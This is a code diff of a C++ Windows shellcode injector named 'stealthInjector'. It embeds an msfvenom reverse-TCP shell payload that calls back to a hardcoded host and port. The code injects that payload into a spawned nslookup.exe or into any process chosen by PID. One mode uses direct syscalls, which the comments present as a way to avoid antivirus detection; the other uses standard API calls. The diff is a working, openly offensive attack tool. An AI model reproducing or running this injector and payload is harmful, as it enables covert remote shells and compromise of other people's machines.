@@ -3,16 +3,18 @@
 #include "winternl.h"
 #include "getSyscall.h"
 #include <fstream>
+#include <iostream>
+#include <fstream>
+#include <string.h>
+#include <string>
+#include <fstream>
+#include <sstream>
 #pragma comment(lib, "ntdll")
 
-/*
-unsigned char shellcode[] =
-"sadfsadfsfasdfasdfas"
-"asdfasdftasdfawrtasd";
-*/
+/* put your shellcode here, I'll eventually add a command line option to read in shellcode from file */
 
-/* Figure out how to generate shellcode that will bypass WindowsDefender*/
-unsigned char shellcode[] = 
+/* msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.43.1 LPORT=1337 -f c */
+unsigned char shellcode[] =
 "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
 "\xff\xff\x48\xbb\x42\xc8\x4d\xe4\x13\x4a\x7e\x09\x48\x31\x58"
 "\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xbe\x80\xce\x00\xe3\xa2"
@@ -48,136 +50,149 @@ unsigned char shellcode[] =
 "\xc2\xcd\x1f\xf3\x3f\x7b\xb2\x05\xdb\x3f\x8b\x79\x4a\x27\x48"
 "\xcb\x12\xb2\x31\x13\x4a\x7e\x09";
 
-using myNtCreateFile = NTSTATUS(NTAPI*)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
-
 using myNtAllocateVirutalMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PULONG RegionSize, ULONG AllocationType, ULONG Protect);
 
 using myNtWriteVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, LPVOID BaseAddress, unsigned char* Buffer, ULONG RegionSize, PULONG numBytesWritten);
 
 using myNtCreateThreadEx = NTSTATUS(NTAPI*)(PHANDLE hThread, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID lpStartAddress, PVOID lpParameter, ULONG Flags, SIZE_T ZeroBits, SIZE_T SizeOfStackCommit, SIZE_T SizeOfStackReserve, PVOID lpBytesBuffer);
 
-int main(int argc, char* argv[]) {
+int injectShellcode(BOOL spawnProc, int PID, BOOL unsafe) {
 
-	/* RICARDO PUT YOUR CODE HERE */
-	string code;
-   	ifstream file("./shellcode.txt");
-	stringstream buffer;
-	buffer<<file.rdbuf();
-	file.close();
-	buffer>>code;
-	cout<<code;
-	unsigned char* shellCode = new unsigned char[code.length()+1];
-	strcpy((char*)shellCode,code.c_str());
-	printf("%s\n",shellCode)
-	/* RICARDO DON'T PUT YOUR CODE AFTER THIS LINE */
-
-	char syscallStub[SYSCALL_STUB_SIZE] = {};
-	char syscallStub2[SYSCALL_STUB_SIZE] = {};
-	char syscallStub3[SYSCALL_STUB_SIZE] = {};
-	char syscallStub4[SYSCALL_STUB_SIZE] = {};
-	DWORD oldProtection = 0;
-
-	// variables for NtCreateFile
-	OBJECT_ATTRIBUTES oa;
-	HANDLE fileHandle = NULL;
-	NTSTATUS status = NULL;
-	UNICODE_STRING fileName;
-	RtlInitUnicodeString(&fileName, (PCWSTR)L"\\??\\c:\\temp\\pw.log");
-	IO_STATUS_BLOCK osb;
-	ZeroMemory(&osb, sizeof(IO_STATUS_BLOCK));
-	InitializeObjectAttributes(&oa, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
-
-	// variables for NtAllocateVirtualMemory & NtWriteVirtualMemory
-	HANDLE processHandle = NULL;
-	SIZE_T RegionSize = sizeof(shellcode);
 	LPVOID allocation_start;
-
-	// variables for NtCreateThreadEx
-	HANDLE hThread;
-
-	// define NtCreateFile
-	myNtCreateFile NtCreateFile = (myNtCreateFile)(LPVOID)syscallStub;
-	VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
-
-	// define NtAllocateVirtualMemory
-	myNtAllocateVirutalMemory NtAllocateVirtualMemory = (myNtAllocateVirutalMemory)(LPVOID)syscallStub2;
-	VirtualProtect(syscallStub2, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
-
-	// define NtWriteVirtualMemory
-	myNtWriteVirtualMemory NtWriteVirtualMemory = (myNtWriteVirtualMemory)(LPVOID)syscallStub3;
-	VirtualProtect(syscallStub3, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
-
-	// define NtCreateThreadEx
-	myNtCreateThreadEx NtCreateThreadEx = (myNtCreateThreadEx)(LPVOID)syscallStub4;
-	VirtualProtect(syscallStub4, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
-
-	GetSyscallStub("NtCreateFile", syscallStub);
-	GetSyscallStub("NtAllocateVirtualMemory", syscallStub2);
-	GetSyscallStub("NtWriteVirtualMemory", syscallStub3);
-	GetSyscallStub("NtCreateThreadEx", syscallStub4);
-	
-	/* The below code starts the process nslookup.exe so we can inject above shellcode into it. */
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
 	LPCWSTR cmd;
-	HANDLE hProcess;
-
-	ZeroMemory(&si, sizeof(si));
-	ZeroMemory(&pi, sizeof(pi));
-	si.cb = sizeof(si);
-	cmd = TEXT("C:\\Windows\\System32\\nslookup.exe");
-
-	if (!CreateProcess(
-		cmd,							// Executable
-		NULL,							// Command line
-		NULL,							// Process handle not inheritable
-		NULL,							// Thread handle not inheritable
-		FALSE,							// Set handle inheritance to FALSE
-		CREATE_NO_WINDOW,	            // Do Not Open a Window
-		NULL,							// Use parent's environment block
-		NULL,							// Use parent's starting directory 
-		&si,			                // Pointer to STARTUPINFO structure
-		&pi								// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
-	)) {
-		DWORD errval = GetLastError();
-		std::cout << "FAILED" << errval << std::endl;
-	}
-	WaitForSingleObject(pi.hProcess, 1000); // Allow nslookup 1 second to start/initialize.
-
-
-
-	/* creates file using direct syscall. only here for testing and referncing, not actually useful and will be deleted soon */
-
-	//NtCreateFile(&fileHandle, FILE_GENERIC_WRITE, &oa, &osb, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
-	
-	
-
-	/* this code will inject into remote process that we did create (nslookup.exe from above) using high level API functions (just for testing, will get detected by AV)*/
-	
-	//allocation_start = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	//WriteProcessMemory(pi.hProcess, allocation_start, shellcode, sizeof(shellcode), NULL);
-	//CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocation_start, NULL, 0, 0);
-
-	
-	
-	/* this code will inject into remote process that we did create (nslookup.exe from above) using direct syscalls */
-	
-	//allocation_start = nullptr;
-	//NtAllocateVirtualMemory(pi.hProcess, &allocation_start, 0, (PULONG)&RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	//NtWriteVirtualMemory(pi.hProcess, allocation_start, shellcode, sizeof(shellcode), 0);
-	//NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, pi.hProcess, allocation_start, allocation_start, FALSE, NULL, NULL, NULL, NULL);
-	
-	
-	
-	/* this code will inject into a remote process that we didnt start given PID using direct syscalls*/
-	
+	myNtAllocateVirutalMemory NtAllocateVirtualMemory;
+	myNtWriteVirtualMemory NtWriteVirtualMemory;
+	myNtCreateThreadEx NtCreateThreadEx;
+	SIZE_T RegionSize = sizeof(shellcode);
+	HANDLE hThread;
 	HANDLE procHandle;
-	procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 10904);
 
-	allocation_start = nullptr;
-	NtAllocateVirtualMemory(procHandle, &allocation_start, 0, (PULONG)&RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	NtWriteVirtualMemory(procHandle, allocation_start, shellcode, sizeof(shellcode), 0);
-	NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, procHandle, allocation_start, allocation_start, FALSE, NULL, NULL, NULL, NULL);
+	// If spawnProc set, then spawn our own process to inject
+	if (spawnProc) {
+		/* The below code starts the process nslookup.exe so we can inject above shellcode into it. */
+
+		printf("[*] Spawning process nslookup.exe\n\n");
+
+		ZeroMemory(&si, sizeof(si));
+		ZeroMemory(&pi, sizeof(pi));
+		si.cb = sizeof(si);
+		cmd = TEXT("C:\\Windows\\System32\\nslookup.exe");
+
+		if (!CreateProcess(
+			cmd,							// Executable
+			NULL,							// Command line
+			NULL,							// Process handle not inheritable
+			NULL,							// Thread handle not inheritable
+			FALSE,							// Set handle inheritance to FALSE
+			CREATE_NO_WINDOW,	            // Do Not Open a Window
+			NULL,							// Use parent's environment block
+			NULL,							// Use parent's starting directory 
+			&si,			                // Pointer to STARTUPINFO structure
+			&pi								// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
+		)) {
+			DWORD errval = GetLastError();
+			std::cout << "FAILED" << errval << std::endl;
+		}
+		WaitForSingleObject(pi.hProcess, 1000); // Allow nslookup 1 second to start/initialize.
+
+		printf("[+] Spawned process nslookup.exe\n\n");
+	}
+
+	// If unsafe not set, then use direct syscalls 
+	if (!unsafe) {
+		/* The below code defines the syscall functions and retrieves syscall stubs */
+
+		char syscallStub_NtAlloc[SYSCALL_STUB_SIZE] = {};
+		char syscallStub_NtWrite[SYSCALL_STUB_SIZE] = {};
+		char syscallStub_NtCreate[SYSCALL_STUB_SIZE] = {};
+		DWORD oldProtection = 0;
+
+		// define NtAllocateVirtualMemory
+		NtAllocateVirtualMemory = (myNtAllocateVirutalMemory)(LPVOID)syscallStub_NtAlloc;
+		VirtualProtect(syscallStub_NtAlloc, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
+
+		// define NtWriteVirtualMemory
+		NtWriteVirtualMemory = (myNtWriteVirtualMemory)(LPVOID)syscallStub_NtWrite;
+		VirtualProtect(syscallStub_NtWrite, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
+
+		// define NtCreateThreadEx
+		NtCreateThreadEx = (myNtCreateThreadEx)(LPVOID)syscallStub_NtCreate;
+		VirtualProtect(syscallStub_NtCreate, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
+
+		// get syscall stubs
+		GetSyscallStub("NtAllocateVirtualMemory", syscallStub_NtAlloc);
+		GetSyscallStub("NtWriteVirtualMemory", syscallStub_NtWrite);
+		GetSyscallStub("NtCreateThreadEx", syscallStub_NtCreate);
+
+		allocation_start = nullptr;
+
+		if (spawnProc) {
+			/* this code will inject into remote process that we did create (nslookup.exe from above) using direct syscalls */
+
+			printf("[*] Injecting into spawned process using direct syscalls\n\n");
+
+			NtAllocateVirtualMemory(pi.hProcess, &allocation_start, 0, (PULONG)&RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+			NtWriteVirtualMemory(pi.hProcess, allocation_start, shellcode, sizeof(shellcode), 0);
+			NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, pi.hProcess, allocation_start, allocation_start, FALSE, NULL, NULL, NULL, NULL);
+			
+			printf("[+] Injected into spawned process\n\n");
+
+			return 0;
+		}
+		else {
+			/* this code will inject into a remote process that we didnt start given PID using direct syscalls */
+
+			printf("[*] Injecting into remote process using direct syscalls\n\n");
+			
+			procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
+			NtAllocateVirtualMemory(procHandle, &allocation_start, 0, (PULONG)&RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+			NtWriteVirtualMemory(procHandle, allocation_start, shellcode, sizeof(shellcode), 0);
+			NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, procHandle, allocation_start, allocation_start, FALSE, NULL, NULL, NULL, NULL);
+			
+			printf("[+] Injected into remote process\n\n");
+
+			return 0;
+		}
+	}
+	else {
+		if (spawnProc) {
+			/* this code will inject into remote process that we did create (nslookup.exe from above) using high level API functions (just for testing, will get detected by AV)*/
+
+			printf("[*] Injecting into spawned process using API calls\n\n");
+
+			allocation_start = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+			WriteProcessMemory(pi.hProcess, allocation_start, shellcode, sizeof(shellcode), NULL);
+			CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocation_start, NULL, 0, 0);
+
+			printf("[+] Injected into spawned process\n\n");
+
+			return 0;
+		}
+		else {
+			/* this code will inject into a remote process that we didnt start given PID using high level API calls */
+
+			printf("[*] Injecting into remote process using API calls\n\n");
+
+			procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
+			allocation_start = VirtualAllocEx(procHandle, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+			WriteProcessMemory(procHandle, allocation_start, shellcode, sizeof(shellcode), NULL);
+			CreateRemoteThread(procHandle, NULL, 0, (LPTHREAD_START_ROUTINE)allocation_start, NULL, 0, 0);
+
+			printf("[+] Injected into remote process\n\n");
+
+			return 0;
+		}
+	}
+	
+	return 0;
+}
+
+int main(int argc, char* argv[]) {
+
+	printf("stealthInjector by @JohnWoodman15\n\n");
+	injectShellcode(true, 0, false);
 
 	return 0;
 }
